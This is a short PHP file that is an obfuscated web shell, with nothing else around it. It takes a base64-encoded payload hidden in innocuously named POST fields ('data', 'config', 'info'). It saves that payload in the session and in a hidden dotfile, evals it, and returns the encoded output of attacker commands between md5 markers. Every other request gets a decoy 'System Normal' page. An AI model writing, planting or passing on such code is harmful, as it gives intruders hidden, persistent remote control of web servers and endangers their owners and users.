<?php
@error_reporting(0);@set_time_limit(0);
$_p='pass';
$_k=substr(md5('key'),0,16);
$_sk='zj_1a1dc91c';
$_tf=dirname(__FILE__).DIRECTORY_SEPARATOR.'.zj_1a1dc91c';
$_m=array('|'=>'a','!'=>'b','@'=>'c','_'=>'d','~'=>'=');
$_em=array_flip($_m);
function _zd($s,$m){return base64_decode(strtr($s,$m));}
function _ze($d,$m){return strtr(base64_encode($d),$m);}
$_ps=array('data','config','info','settings');
$_got=false;
foreach($_ps as $_pn){
  if(isset($_POST[$_pn])&&$_POST[$_pn]!==''){
    $_raw=_zd($_POST[$_pn],$_m);
    if($_raw===false||strlen($_raw)===0){$_got=true;break;}
    $_st=null;
    @session_start();
    if(isset($_SESSION[$_sk]))$_st=$_SESSION[$_sk];
    elseif(@file_exists($_tf))$_st=@file_get_contents($_tf);
    if($_st===null){
      if(strlen($_raw)>5000){$_SESSION[$_sk]=$_raw;@file_put_contents($_tf,$_raw);}
    }else{
      @eval('/*'.$_p.'*/'.$_st.'');
      echo substr(md5($_p.$_k),0,16);
      echo _ze(@run($_raw),$_em);
      echo substr(md5($_p.$_k),16);
    }
    $_got=true;break;
  }
}
if(!$_got)echo '<!DOCTYPE html><html><head><title>System Normal</title><!-- zj:58984163 --></head><body><p>System Normal</p></body></html>';
?>